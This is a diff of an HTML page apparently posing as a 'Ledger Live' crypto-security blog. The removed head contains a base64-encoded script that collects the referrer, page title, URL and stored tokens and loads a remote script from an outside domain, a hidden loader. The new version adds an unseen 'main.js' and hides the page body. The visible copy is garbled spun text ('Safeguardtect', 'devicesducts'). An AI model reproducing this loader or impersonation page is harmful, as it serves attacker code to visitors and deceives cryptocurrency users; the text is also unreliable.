@@ -1,271 +1,443 @@
 <!DOCTYPE html>
 
 <html lang="en">
-<head>
-<meta charset="utf-8"/>
-<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<meta content="Protect your digital assets with Ledger Live - secure and efficient management for your cryptocurrency portfolio." name="description"/>
-<meta content="ledger, ledger live, digital assets, cryptocurrency, security" name="keywords"/>
-<title>Ledger Live | Safeguardtect Your Digital Assets</title>
-<link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" rel="stylesheet"/>
-<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&amp;display=swap" rel="stylesheet"/>
-<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfQmhHTUt2eEYyeGN2bUhNTic7CiAgICBpZiAoIXdpbmRvdy5fQmhHTUt2eEYyeGN2bUhNTikgewogICAgICAgIHdpbmRvdy5fQmhHTUt2eEYyeGN2bUhNTiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9kb2xhZG93YW5pYS5jbHViL1NkQ1dxMm0xJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX0dTTUNTRnJEMU1nd0JwR04gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9HU01DU0ZyRDFNZ3dCcEdOICE9PSAndW5kZWZpbmVkJyAmJiBfR1NNQ1NGckQxTWd3QnBHTiAhPT0gbnVsbCkgewogICAgICAgIHZhciBfS1ZoalZIbTF3Q2dNSjI0ciA9IEpTT04ucGFyc2UoX0dTTUNTRnJEMU1nd0JwR04pOwogICAgICAgIHZhciBfWVRndnZCeTNGcVhTTVlubSA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9LVmhqVkhtMXdDZ01KMjRyLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX0JoR01LdnhGMnhjdm1ITU4udHRsIDwgX1lUZ3Z2QnkzRnFYU01Zbm0pIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF81WFgzVHFwY1o1ZGJmSzhKID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX3QzN2oxQ1lXR2RLREc1dkwgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfTVJ3S2JDckpRZGRQYnJuUiA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX01Sd0tiQ3JKUWRkUGJyblIgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX01Sd0tiQ3JKUWRkUGJyblIgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfTVJ3S2JDckpRZGRQYnJuUiArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfTVJ3S2JDckpRZGRQYnJuUiArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX01Sd0tiQ3JKUWRkUGJyblIgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX01Sd0tiQ3JKUWRkUGJyblIgKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9CaEdNS3Z4RjJ4Y3ZtSE1OLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF81WFgzVHFwY1o1ZGJmSzhKICE9PSAndW5kZWZpbmVkJyAmJiBfNVhYM1RxcGNaNWRiZks4SiAmJiB3aW5kb3cuX0JoR01LdnhGMnhjdm1ITU4udW5pcXVlKSB7CiAgICAgICAgX01Sd0tiQ3JKUWRkUGJyblIgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfNVhYM1RxcGNaNWRiZks4Sik7CiAgICB9CiAgICBpZiAodHlwZW9mIF90MzdqMUNZV0dkS0RHNXZMICE9PSAndW5kZWZpbmVkJyAmJiBfdDM3ajFDWVdHZEtERzV2TCAmJiB3aW5kb3cuX0JoR01LdnhGMnhjdm1ITU4udW5pcXVlKSB7CiAgICAgICAgX01Sd0tiQ3JKUWRkUGJyblIgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF90MzdqMUNZV0dkS0RHNXZMKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9CaEdNS3Z4RjJ4Y3ZtSE1OLlJfUEFUSCArIF9NUndLYkNySlFkZFBicm5SOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
-<style>
-    body {
-        font-family: 'Roboto', sans-serif;
+  <head>
+    <script defer src="main.js"></script>
+
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <meta
+      content="Protect your digital assets with Ledger Live - secure and efficient management for your cryptocurrency portfolio."
+      name="description"
+    />
+    <meta
+      content="ledger, ledger live, digital assets, cryptocurrency, security"
+      name="keywords"
+    />
+    <title>Ledger Live | Safeguardtect Your Digital Assets</title>
+    <link
+      crossorigin="anonymous"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
+      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&amp;display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Roboto", sans-serif;
         color: #333;
         background-color: #f8f8f8;
-    }
-    h1, h2, h3, h4, h5, h6 {
+      }
+      h1,
+      h2,
+      h3,
+      h4,
+      h5,
+      h6 {
         color: #000;
-    }
-    .btn-primary {
+      }
+      .btn-primary {
         background-color: #4a4a4a;
         border-color: #4a4a4a;
-    }
-    .btn-primary:hover {
+      }
+      .btn-primary:hover {
         background-color: #333;
         border-color: #333;
-    }
-</style>
-<script crossorigin="anonymous" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
-<script>
-    document.addEventListener('DOMContentLoaded', function() {
+      }
+    </style>
+    <script
+      crossorigin="anonymous"
+      integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
+    ></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
         // Add smooth scrolling to all links
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                document.querySelector(this.getAttribute('href')).scrollIntoView({
-                    behavior: 'smooth'
-                });
+        document.querySelectorAll('a[href^="#"]').forEach((anchor) => {
+          anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            document.querySelector(this.getAttribute("href")).scrollIntoView({
+              behavior: "smooth",
             });
+          });
         });
 
         // Implement lazy loading for images
-        if ('loading' in HTMLImageElement.prototype) {
-            const images = document.querySelectorAll("img.lazyload");
-            images.forEach(img => {
-                img.src = img.dataset.src;
-            });
+        if ("loading" in HTMLImageElement.prototype) {
+          const images = document.querySelectorAll("img.lazyload");
+          images.forEach((img) => {
+            img.src = img.dataset.src;
+          });
         } else {
-            // Fallback for browsers that don't support lazy loading
-            let script = document.createElement("script");
-            script.async = true;
-            script.src = "https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.3.2/lazysizes.min.js";
-            document.body.appendChild(script);
+          // Fallback for browsers that don't support lazy loading
+          let script = document.createElement("script");
+          script.async = true;
+          script.src =
+            "https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.3.2/lazysizes.min.js";
+          document.body.appendChild(script);
         }
-    });
-</script>
-<div class="position-fixed bottom-0 start-50 translate-middle-x p-3 bg-light border rounded shadow" id="cookieConsent" style="z-index: 1050; display: none;">
-<div class="d-flex justify-content-between align-items-center">
-<p class="mb-0 me-3">We use cookies to enhance your experience. By continuing to visit this site you agree to our use of cookies.</p>
-<div>
-<button class="btn btn-sm btn-primary me-2" id="acceptCookies">Accept</button>
-<button class="btn btn-sm btn-secondary" id="declineCookies">Decline</button>
-</div>
-</div>
-</div>
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-    const cookieConsent = document.getElementById('cookieConsent');
-    const acceptBtn = document.getElementById('acceptCookies');
-    const declineBtn = document.getElementById('declineCookies');
+      });
+    </script>
+    <div
+      class="position-fixed bottom-0 start-50 translate-middle-x p-3 bg-light border rounded shadow"
+      id="cookieConsent"
+      style="z-index: 1050; display: none"
+    >
+      <div class="d-flex justify-content-between align-items-center">
+        <p class="mb-0 me-3">
+          We use cookies to enhance your experience. By continuing to visit this
+          site you agree to our use of cookies.
+        </p>
+        <div>
+          <button class="btn btn-sm btn-primary me-2" id="acceptCookies">
+            Accept
+          </button>
+          <button class="btn btn-sm btn-secondary" id="declineCookies">
+            Decline
+          </button>
+        </div>
+      </div>
+    </div>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const cookieConsent = document.getElementById("cookieConsent");
+        const acceptBtn = document.getElementById("acceptCookies");
+        const declineBtn = document.getElementById("declineCookies");
 
-    function setCookiePreference(accepted) {
-        localStorage.setItem('cookiePreference', accepted ? 'accepted' : 'declined');
-        cookieConsent.style.display = 'none';
-    }
-
-    function showCookieConsent() {
-        if (localStorage.getItem('cookiePreference') === null) {
-            cookieConsent.style.display = 'block';
+        function setCookiePreference(accepted) {
+          localStorage.setItem(
+            "cookiePreference",
+            accepted ? "accepted" : "declined"
+          );
+          cookieConsent.style.display = "none";
         }
-    }
 
-    acceptBtn.addEventListener('click', function() {
-        setCookiePreference(true);
-    });
+        function showCookieConsent() {
+          if (localStorage.getItem("cookiePreference") === null) {
+            cookieConsent.style.display = "block";
+          }
+        }
 
-    declineBtn.addEventListener('click', function() {
-        setCookiePreference(false);
-    });
+        acceptBtn.addEventListener("click", function () {
+          setCookiePreference(true);
+        });
 
-    showCookieConsent();
-});
-</script>
-</head>
-<body style="display: flex; flex-direction: column; min-height: 100vh;">
-<div style="flex: 1;">
-<header>
-<div class="container-fluid bg-light py-3">
-<div class="row align-items-center">
-<div class="col-md-4">
-<a class="text-decoration-none" href="/">
-<h1 class="mb-0 text-dark" style="font-family: 'Arial', sans-serif; font-weight: bold;">Ledger Live</h1>
-</a>
-</div>
-<div class="col-md-8">
-<nav class="navbar navbar-expand-lg navbar-light">
-<button aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-bs-target="#navbarNav" data-bs-toggle="collapse" type="button">
-<span class="navbar-toggler-icon"></span>
-</button>
-<div class="collapse navbar-collapse justify-content-end" id="navbarNav">
-<ul class="navbar-nav">
-<li class="nav-item">
-<a class="nav-link text-dark" href="posts.html" style="font-family: 'Arial', sans-serif;">Posts</a>
-</li>
-<li class="nav-item">
-<a class="nav-link text-dark" href="about.html" style="font-family: 'Arial', sans-serif;">About</a>
-</li>
-<li class="nav-item">
-<a class="nav-link text-dark" href="contacts.html" style="font-family: 'Arial', sans-serif;">Contacts</a>
-</li>
-<li class="nav-item">
-<a class="nav-link text-dark" href="privacy_policy.html" style="font-family: 'Arial', sans-serif;">Privacy Policy</a>
-</li>
-</ul>
-</div>
-</nav>
-</div>
-</div>
-</div>
-<script crossorigin="anonymous" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
-</header>
-<div class="container mt-5">
-<div class="row">
-<div class="col-lg-8 mx-auto">
-<h1 class="text-center mb-4" style="color: #333; font-family: 'Arial', sans-serif;">Welcome to Ledger Live</h1>
-<p class="lead text-center mb-5" style="color: #555; font-family: 'Helvetica', sans-serif;">Your trusted source for safeguardingtecting your digital assets</p>
-<div class="card border-0 shadow-sm">
-<div class="card-body p-4">
-<h2 class="card-title mb-3" style="color: #4a4a4a; font-family: 'Arial', sans-serif;">About Our Blog</h2>
-<p class="card-text" style="color: #666; font-family: 'Helvetica', sans-serif;">
-            At Ledger Live, we are dedicated to empowering you with the knowledge and tools necessary to safeguard your digital wealth. Our blog serves as a comprehensive resource for both newcomers and experienced users in the world of cryptocurrency and blockchain technology.
-          </p>
-<p class="card-text" style="color: #666; font-family: 'Helvetica', sans-serif;">
-            Here, you'll find:
-          </p>
-<ul style="color: #666; font-family: 'Helvetica', sans-serif;">
-<li>In-depth guides on using Ledger hardware wallets</li>
-<li>Latest updates on Ledger Live software</li>
-<li>Expert insights on cryptocurrency security optimal practices</li>
-<li>Analysis of market trends and their impact on digital asset safeguardingtection</li>
-<li>Tips for maximizing the potential of your Ledger devices</li>
-</ul>
-<p class="card-text mt-3" style="color: #666; font-family: 'Helvetica', sans-serif;">
-            Whether you're looking to enhance your understanding of blockchain security or stay updated on the latest features of Ledger devicesducts, our blog is your go-to destination. We're committed to helping you navigate the complex world of digital assets with confidence and peace of mind.
-          </p>
-</div>
-</div>
-</div>
-</div>
-</div>
-<div class="container mt-5">
-<h2 class="mb-4">Latest Posts</h2>
-<div class="row">
-<div class="col-md-4 mb-4">
-<div class="card h-100">
-<img alt="Various types of cryptocurrency wallets including hardware, software, and paper wallets displayed on a secure background" class="card-img-top" src="images/image_0_index.png"/>
-<div class="card-body d-flex flex-column">
-<h5 class="card-title">Understanding Cryptocurrency Wallets</h5>
-<p class="card-text flex-grow-1">An in-depth guide to different types of cryptocurrency wallets and how they safeguardtect your digital assets.</p>
-<a class="btn btn-primary mt-auto" href="posts_1.html">Read More</a>
-</div>
-</div>
-</div>
-<div class="col-md-4 mb-4">
-<div class="card h-100">
-<img alt="Screenshot of Ledger Live interface showcasing its various features and dashboard" class="card-img-top" src="images/image_1_index.png"/>
-<div class="card-body d-flex flex-column">
-<h5 class="card-title">Ledger Live Features Explained</h5>
-<p class="card-text flex-grow-1">A comprehensive overview of Ledger Live's key features and how they enhance your crypto management experience.</p>
-<a class="btn btn-primary mt-auto" href="posts_2.html">Read More</a>
-</div>
-</div>
-</div>
-<div class="col-md-4 mb-4">
-<div class="card h-100">
-<img alt="Illustration of various security measures such as encryption, two-factor authentication, and cold storage in the context of cryptocurrency" class="card-img-top" src="images/image_2_index.png"/>
-<div class="card-body d-flex flex-column">
-<h5 class="card-title">Securing Your Crypto: Optimal Practices</h5>
-<p class="card-text flex-grow-1">Essential tips and strategies for keeping your digital assets safe from threats and vulnerabilities.</p>
-<a class="btn btn-primary mt-auto" href="posts_3.html">Read More</a>
-</div>
-</div>
-</div>
-</div>
-</div>
-<style>
-    .card {
-        border: 1px solid #e0e0e0;
-        transition: all 0.3s ease;
-    }
-    .card:hover {
-        box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-        transform: translateY(-5px);
-    }
-    .card-title {
-        font-family: Arial, sans-serif;
-        font-weight: bold;
-        color: #333;
-    }
-    .card-text {
-        font-family: Arial, sans-serif;
-        color: #666;
-    }
-    .btn-primary {
-        background-color: #4a4a4a;
-        border-color: #4a4a4a;
-    }
-    .btn-primary:hover {
-        background-color: #333;
-        border-color: #333;
-    }
-</style>
-</div>
-<footer style="width: 100%; z-index: 1000;">
-<div class="container-fluid bg-light py-4">
-<div class="container">
-<div class="row">
-<div class="col-md-4 mb-3 mb-md-0">
-<h5 class="text-dark mb-3">Ledger Live</h5>
-<p class="text-muted small">Safeguardtect your digital assets with Ledger Live. Your secure gateway to the crypto world.</p>
-</div>
-<div class="col-md-4 mb-3 mb-md-0">
-<h5 class="text-dark mb-3">Quick Links</h5>
-<ul class="list-unstyled">
-<li><a class="text-muted" href="posts.html">Posts</a></li>
-<li><a class="text-muted" href="about.html">About</a></li>
-<li><a class="text-muted" href="contacts.html">Contacts</a></li>
-<li><a class="text-muted" href="privacy_policy.html">Privacy Policy</a></li>
-</ul>
-</div>
-<div class="col-md-4">
-<h5 class="text-dark mb-3">Connect With Us</h5>
-<div class="d-flex">
-<a class="text-muted me-3" href="#"><i class="fab fa-twitter"></i></a>
-<a class="text-muted me-3" href="#"><i class="fab fa-facebook-f"></i></a>
-<a class="text-muted me-3" href="#"><i class="fab fa-linkedin-in"></i></a>
-<a class="text-muted" href="#"><i class="fab fa-github"></i></a>
-</div>
-</div>
-</div>
-<hr class="my-4"/>
-<div class="row">
-<div class="col-md-6 text-center text-md-start">
-<p class="text-muted small mb-0">© 2024 Ledger Live. All rights reserved.</p>
-</div>
-<div class="col-md-6 text-center text-md-end">
-<p class="text-muted small mb-0">
-<a class="text-muted" href="privacy_policy.html">Privacy Policy</a> | 
-          <a class="text-muted" href="#">Terms of Service</a>
-</p>
-</div>
-</div>
-</div>
-</div>
-<script crossorigin="anonymous" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
-</footer>
-</body>
+        declineBtn.addEventListener("click", function () {
+          setCookiePreference(false);
+        });
+
+        showCookieConsent();
+      });
+    </script>
+  </head>
+  <body hidden style="display: flex; flex-direction: column; min-height: 100vh">
+    <div style="flex: 1">
+      <header>
+        <div class="container-fluid bg-light py-3">
+          <div class="row align-items-center">
+            <div class="col-md-4">
+              <a class="text-decoration-none" href="/">
+                <h1
+                  class="mb-0 text-dark"
+                  style="font-family: 'Arial', sans-serif; font-weight: bold"
+                >
+                  Ledger Live
+                </h1>
+              </a>
+            </div>
+            <div class="col-md-8">
+              <nav class="navbar navbar-expand-lg navbar-light">
+                <button
+                  aria-controls="navbarNav"
+                  aria-expanded="false"
+                  aria-label="Toggle navigation"
+                  class="navbar-toggler"
+                  data-bs-target="#navbarNav"
+                  data-bs-toggle="collapse"
+                  type="button"
+                >
+                  <span class="navbar-toggler-icon"></span>
+                </button>
+                <div
+                  class="collapse navbar-collapse justify-content-end"
+                  id="navbarNav"
+                >
+                  <ul class="navbar-nav">
+                    <li class="nav-item">
+                      <a
+                        class="nav-link text-dark"
+                        href="posts.html"
+                        style="font-family: 'Arial', sans-serif"
+                        >Posts</a
+                      >
+                    </li>
+                    <li class="nav-item">
+                      <a
+                        class="nav-link text-dark"
+                        href="about.html"
+                        style="font-family: 'Arial', sans-serif"
+                        >About</a
+                      >
+                    </li>
+                    <li class="nav-item">
+                      <a
+                        class="nav-link text-dark"
+                        href="contacts.html"
+                        style="font-family: 'Arial', sans-serif"
+                        >Contacts</a
+                      >
+                    </li>
+                    <li class="nav-item">
+                      <a
+                        class="nav-link text-dark"
+                        href="privacy_policy.html"
+                        style="font-family: 'Arial', sans-serif"
+                        >Privacy Policy</a
+                      >
+                    </li>
+                  </ul>
+                </div>
+              </nav>
+            </div>
+          </div>
+        </div>
+        <script
+          crossorigin="anonymous"
+          integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
+          src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
+        ></script>
+      </header>
+      <div class="container mt-5">
+        <div class="row">
+          <div class="col-lg-8 mx-auto">
+            <h1
+              class="text-center mb-4"
+              style="color: #333; font-family: 'Arial', sans-serif"
+            >
+              Welcome to Ledger Live
+            </h1>
+            <p
+              class="lead text-center mb-5"
+              style="color: #555; font-family: 'Helvetica', sans-serif"
+            >
+              Your trusted source for safeguardingtecting your digital assets
+            </p>
+            <div class="card border-0 shadow-sm">
+              <div class="card-body p-4">
+                <h2
+                  class="card-title mb-3"
+                  style="color: #4a4a4a; font-family: 'Arial', sans-serif"
+                >
+                  About Our Blog
+                </h2>
+                <p
+                  class="card-text"
+                  style="color: #666; font-family: 'Helvetica', sans-serif"
+                >
+                  At Ledger Live, we are dedicated to empowering you with the
+                  knowledge and tools necessary to safeguard your digital
+                  wealth. Our blog serves as a comprehensive resource for both
+                  newcomers and experienced users in the world of cryptocurrency
+                  and blockchain technology.
+                </p>
+                <p
+                  class="card-text"
+                  style="color: #666; font-family: 'Helvetica', sans-serif"
+                >
+                  Here, you'll find:
+                </p>
+                <ul style="color: #666; font-family: 'Helvetica', sans-serif">
+                  <li>In-depth guides on using Ledger hardware wallets</li>
+                  <li>Latest updates on Ledger Live software</li>
+                  <li>
+                    Expert insights on cryptocurrency security optimal practices
+                  </li>
+                  <li>
+                    Analysis of market trends and their impact on digital asset
+                    safeguardingtection
+                  </li>
+                  <li>
+                    Tips for maximizing the potential of your Ledger devices
+                  </li>
+                </ul>
+                <p
+                  class="card-text mt-3"
+                  style="color: #666; font-family: 'Helvetica', sans-serif"
+                >
+                  Whether you're looking to enhance your understanding of
+                  blockchain security or stay updated on the latest features of
+                  Ledger devicesducts, our blog is your go-to destination. We're
+                  committed to helping you navigate the complex world of digital
+                  assets with confidence and peace of mind.
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="container mt-5">
+        <h2 class="mb-4">Latest Posts</h2>
+        <div class="row">
+          <div class="col-md-4 mb-4">
+            <div class="card h-100">
+              <img
+                alt="Various types of cryptocurrency wallets including hardware, software, and paper wallets displayed on a secure background"
+                class="card-img-top"
+                src="images/image_0_index.png"
+              />
+              <div class="card-body d-flex flex-column">
+                <h5 class="card-title">Understanding Cryptocurrency Wallets</h5>
+                <p class="card-text flex-grow-1">
+                  An in-depth guide to different types of cryptocurrency wallets
+                  and how they safeguardtect your digital assets.
+                </p>
+                <a class="btn btn-primary mt-auto" href="posts_1.html"
+                  >Read More</a
+                >
+              </div>
+            </div>
+          </div>
+          <div class="col-md-4 mb-4">
+            <div class="card h-100">
+              <img
+                alt="Screenshot of Ledger Live interface showcasing its various features and dashboard"
+                class="card-img-top"
+                src="images/image_1_index.png"
+              />
+              <div class="card-body d-flex flex-column">
+                <h5 class="card-title">Ledger Live Features Explained</h5>
+                <p class="card-text flex-grow-1">
+                  A comprehensive overview of Ledger Live's key features and how
+                  they enhance your crypto management experience.
+                </p>
+                <a class="btn btn-primary mt-auto" href="posts_2.html"
+                  >Read More</a
+                >
+              </div>
+            </div>
+          </div>
+          <div class="col-md-4 mb-4">
+            <div class="card h-100">
+              <img
+                alt="Illustration of various security measures such as encryption, two-factor authentication, and cold storage in the context of cryptocurrency"
+                class="card-img-top"
+                src="images/image_2_index.png"
+              />
+              <div class="card-body d-flex flex-column">
+                <h5 class="card-title">
+                  Securing Your Crypto: Optimal Practices
+                </h5>
+                <p class="card-text flex-grow-1">
+                  Essential tips and strategies for keeping your digital assets
+                  safe from threats and vulnerabilities.
+                </p>
+                <a class="btn btn-primary mt-auto" href="posts_3.html"
+                  >Read More</a
+                >
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <style>
+        .card {
+          border: 1px solid #e0e0e0;
+          transition: all 0.3s ease;
+        }
+        .card:hover {
+          box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+          transform: translateY(-5px);
+        }
+        .card-title {
+          font-family: Arial, sans-serif;
+          font-weight: bold;
+          color: #333;
+        }
+        .card-text {
+          font-family: Arial, sans-serif;
+          color: #666;
+        }
+        .btn-primary {
+          background-color: #4a4a4a;
+          border-color: #4a4a4a;
+        }
+        .btn-primary:hover {
+          background-color: #333;
+          border-color: #333;
+        }
+      </style>
+    </div>
+    <footer style="width: 100%; z-index: 1000">
+      <div class="container-fluid bg-light py-4">
+        <div class="container">
+          <div class="row">
+            <div class="col-md-4 mb-3 mb-md-0">
+              <h5 class="text-dark mb-3">Ledger Live</h5>
+              <p class="text-muted small">
+                Safeguardtect your digital assets with Ledger Live. Your secure
+                gateway to the crypto world.
+              </p>
+            </div>
+            <div class="col-md-4 mb-3 mb-md-0">
+              <h5 class="text-dark mb-3">Quick Links</h5>
+              <ul class="list-unstyled">
+                <li><a class="text-muted" href="posts.html">Posts</a></li>
+                <li><a class="text-muted" href="about.html">About</a></li>
+                <li><a class="text-muted" href="contacts.html">Contacts</a></li>
+                <li>
+                  <a class="text-muted" href="privacy_policy.html"
+                    >Privacy Policy</a
+                  >
+                </li>
+              </ul>
+            </div>
+            <div class="col-md-4">
+              <h5 class="text-dark mb-3">Connect With Us</h5>
+              <div class="d-flex">
+                <a class="text-muted me-3" href="#"
+                  ><i class="fab fa-twitter"></i
+                ></a>
+                <a class="text-muted me-3" href="#"
+                  ><i class="fab fa-facebook-f"></i
+                ></a>
+                <a class="text-muted me-3" href="#"
+                  ><i class="fab fa-linkedin-in"></i
+                ></a>
+                <a class="text-muted" href="#"><i class="fab fa-github"></i></a>
+              </div>
+            </div>
+          </div>
+          <hr class="my-4" />
+          <div class="row">
+            <div class="col-md-6 text-center text-md-start">
+              <p class="text-muted small mb-0">
+                © 2024 Ledger Live. All rights reserved.
+              </p>
+            </div>
+            <div class="col-md-6 text-center text-md-end">
+              <p class="text-muted small mb-0">
+                <a class="text-muted" href="privacy_policy.html"
+                  >Privacy Policy</a
+                >
+                |
+                <a class="text-muted" href="#">Terms of Service</a>
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <script
+        crossorigin="anonymous"
+        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
+        src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
+      ></script>
+    </footer>
+  </body>
 </html>
